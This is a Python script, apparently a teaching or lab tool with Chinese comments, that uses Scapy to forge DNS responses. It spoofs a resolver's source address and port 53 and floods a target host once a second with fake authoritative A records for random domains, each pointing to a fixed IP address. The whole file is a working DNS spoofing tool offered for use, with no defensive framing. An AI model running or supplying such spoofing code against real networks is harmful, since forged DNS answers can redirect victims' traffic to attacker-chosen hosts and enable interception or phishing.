from scapy.all import *
import random
import string
import time

from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP


def random_domain(tld="com", length=10):
    """生成随机域名"""
    letters = string.ascii_lowercase
    domain = ''.join(random.choice(letters) for i in range(length))
    return f"{domain}.{tld}"

def send_fake_dns_response(src_ip, dst_ip, src_port, dst_port, qname, rdata):
    """发送一个伪造的DNS响应包"""
    # 创建IP层
    ip = IP(src=src_ip, dst=dst_ip)
    # 创建UDP层
    udp = UDP(sport=src_port, dport=dst_port)
    # 创建DNS层
    dns = DNS(id=random.randint(1, 65535), qr=1, aa=1, rd=0, ra=0, qdcount=1,
              ancount=1, nscount=0, arcount=0,
              qd=DNSQR(qname=qname, qtype='A', qclass='IN'),
              an=DNSRR(rrname=qname, ttl=86400, type='A', rclass='IN', rdata=rdata))
    # 组装完整的DNS包
    packet = ip/udp/dns
    # 发送包
    send(packet)

def main():
    src_ip = '192.168.0.1'
    dst_ip = '192.168.0.100'
    src_port = 53
    dst_port = 33333
    while True:
        domain = random_domain()
        print(f"Sending fake response for {domain}")
        send_fake_dns_response(src_ip, dst_ip, src_port, dst_port, domain, '93.184.216.34')
        time.sleep(1)  # 每秒发送一次

if __name__ == "__main__":
    main()
